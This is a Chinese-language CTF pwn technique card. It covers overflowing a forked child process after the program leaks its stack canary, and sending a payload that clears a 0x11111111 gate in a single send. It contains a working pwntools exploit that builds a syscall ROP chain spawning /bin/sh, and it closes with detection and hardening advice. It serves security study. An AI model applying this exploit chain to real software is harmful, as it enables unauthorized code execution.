---
id: ctf-pwn-fork-child-hidden-func-single-send-canary-overflow
title: 漏洞在 fork 出的子进程里、canary 又已白送：把两轮读取数据一次性 send 完，才能覆盖到子进程的返回地址
type: scenario
domain: ctf
path: ctf/pwn
technique: fork-child-single-send-canary-leak-hidden-function-overflow
aliases:
- 程序赠予 canary
- fork 子进程才执行漏洞函数
- 一次 send 完成多轮读取
- 隐藏函数 0x11111111 判断
- 静态二进制 syscall ROP
tags:
- pwn
- stack
- canary
- fork
- syscall-rop
- static-binary
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:56:53+08:00'
  notes: 已对照原文核对；本次核对未读取图片；gift 直接打印 canary、隐藏函数在 fork 子进程且需父进程结束才执行、输入某段需等于 0x11111111 才跳转、必须一次性 send 才可能覆盖返回地址（原文明确「我们一次性发送我们需要的数据,才有可能覆盖到返回的地址」）、静态二进制用 syscall + pop rax/rdi/rsi/rdx_rbx 拼 read(0,bss,0x80)+execve 均在正文与 exp；填充 0x100、canary 重复次数在原文用 p64(canary)*4 调试、exp 用 *3，卡内按 exp 写 *3 并已说明至少三处需填对
---

## 一句话结论

当父进程把一个"礼物"（本例是 canary 明文）打印给你、真正的溢出点却在 `fork` 出来的子进程里、且子进程要等父进程结束才跑函数时，交互式分次发送会失效——必须把两轮读取需要的字节**一次性 `send` 完**（用一段固定的填充值 + 已知 canary 凑出正确偏移），才能让子进程那次 `read` 拿到足够长的数据覆盖到返回地址，再用静态二进制里的 `syscall` gadget 写 `execve("/bin/sh", 0, 0)`。

## 原理

- **canary 被主动泄露**：函数把含 `canary` 的值格式化输出（本例 `gift: <18 位十六进制>`），攻击者直接读到栈保护值，`-fstack-protector` 等于失效。
- **漏洞函数不在主流程里**：主进程只做 `read` + `puts`，真正被调用的"隐藏函数"要等父进程 `exit` 之后由子进程执行；此时 `fork` 已经发生，父子进程栈是**各自独立的副本**，父进程里的输入不会流到子进程的栈上。
- **必须一次 send**：子进程的 `read` 长度固定，若分两次发送，第一次只会被第一轮读取吃掉，第二轮读到空数据，溢出的字节数不够。把「填充 + 魔数数组 + canary + ROP」一次发完，第二次读取就能落到正确的栈位置。
- **魔数数组用于对齐**：子进程里有个判断要求输入中的某段等于 `0x11111111` 才会跳进真正会溢出的函数（本例用 `p32(0x11111111) * 64` 铺 256 字节），这段既是"通行证"又是填充，把 `canary` 顶到与 saved 值相同的偏移。
- **canary 要重复多次**：不同栈帧上并存多个 canary 副本（递归/多层调用），exp 里 `p64(canary) * 3` 说明至少三处需要填对，否则中途 `__stack_chk_fail`。
- **静态二进制省掉 libc**：程序静态链接、没有 libc 符号可用，直接用 `syscall; ret` + `pop rax/pop rdi/pop rsi/pop rdx; pop rbx; ret` 拼 `read(0, bss, 0x80)` 再 `execve(bss, 0, 0)`。

## 触发条件

- 程序主动打印 canary（或有其它可直接读出栈保护值的泄露点）。
- 溢出发生在 `fork` 之后的子进程路径里，且子进程的输入来自**同一连接**；父进程后续行为会影响子进程何时开始读。
- 单次 `read` 的长度足以覆盖到返回地址（需一次发送完整 payload）。
- 二进制静态链接或已知 gadget 地址（本例为固定加载地址的非 PIE）。
- 存在 `syscall; ret` 与设置 `rax/rdi/rsi/rdx` 的 gadget。

## 利用步骤

1. 反编译三个函数：初始化、`fork` + `read/puts`、以及"用输入当函数指针调用"的那一个，确认 canary 泄露位置与 fork 时机。
2. 用 gdb 的 `set follow-fork-mode child` + `set detach-on-fork off` 跟踪子进程，在父子两侧都下断点，找出真正被调用的隐藏函数与它的判断条件（本例输入某段等于 `0x11111111`）。
3. 收下 `gift` 里的 canary 值。
4. 计算偏移：填充 `0x100` 字节 → `p32(0x11111111) * 64` → `p64(canary) * 3` → 再接 ROP。
5. **一次性** `send` 整个 payload，不要分两次；随后再单独发 `/bin/sh\x00` 供第二段 `read` 使用。
6. ROP：`read(0, bss, 0x80)` 把 `/bin/sh` 写进 `bss`，再 `execve(bss, 0, 0)`。

## PoC

```python
from pwn import *
elf = ELF('./pwn')
p = process(elf.path)

p.recvuntil(b'gift: ')
canary = int(p.recv(18), 16)

syscall    = 0x41ac26        # syscall ; ret
pop_rax    = 0x450277        # pop rax ; ret
pop_rdi    = 0x40213f        # pop rdi ; ret
pop_rsi    = 0x40a1ae        # pop rsi ; ret
pop_rdx_rbx= 0x485feb        # pop rdx ; pop rbx ; ret
bss        = elf.bss(0x300)

p.sendafter(b'leave your name', p64(1) * 8)
p.sendafter(b'Wanna return?', b'1')

pay  = b'a' * 0x100 + p32(0x11111111) * 64 + p64(canary) * 3
pay += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss)
pay += p64(pop_rdx_rbx) + p64(0x80) * 2 + p64(syscall)          # read(0, bss, 0x80)
pay += p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0)
pay += p64(pop_rdx_rbx) + p64(0) * 2 + p64(syscall)             # execve("/bin/sh",0,0)

p.sendafter(b'once again?', pay)          # 必须一次性发完
p.send(b'/bin/sh\x00')
p.interactive()
```

## 变体与关联

- 变体：canary 不直接给，而是通过格式化字符串 `%17$p` 或越界读泄露；或用 `fork` 子进程 canary 相同的特点逐字节爆破（见相关卡）。
- 变体：子进程只读一次时，可把 ROP 链塞进同一 payload 的那一次读取窗口，省掉第二段 `read`。
- 变体：有 libc 时把 syscall ROP 换成 `ret2libc`/`one_gadget`；静态二进制则只能靠 syscall gadget 或 `mprotect` + shellcode。
- 关联：[[binary-pwn-stack-fork-canary-bytewise-bruteforce]]（同样 fork 场景，但 canary 靠爆破而非白送）、[[binary-pwn-stack-ret2syscall-64bit-bss-binsh-execve]]（syscall ROP 的标准形态）、[[ctf-pwn-login-char-by-char-prefix-brute-local-credential]]（同篇另一题的登录门）。
- 边界：若 `fork` 后父进程不退出、子进程的 `read` 永远不来，则必须按父进程的交互顺序精确对齐发送时机；若程序对输入做了长度上限校验，则 `0x11111111` 数组会先被截断。

## 检测与防御

- 检测（CTF/审计）：`printf("%p", canary)` 之类把栈保护值输出；`fork()` 之后子进程再处理用户输入且存在 `read` 定长读取；用函数指针/魔数做"隐藏入口"。
- 修复：不要向用户输出 canary 或任何栈地址；子进程处理输入前重置缓冲；`read` 长度严格限制在缓冲区大小内。
- 加固：开启 PIE + Full RELRO，使 gadget 地址不可预测；开启 `-fstack-clash-protection`；生产环境中禁用不必要的 `fork` + 交互式子进程。
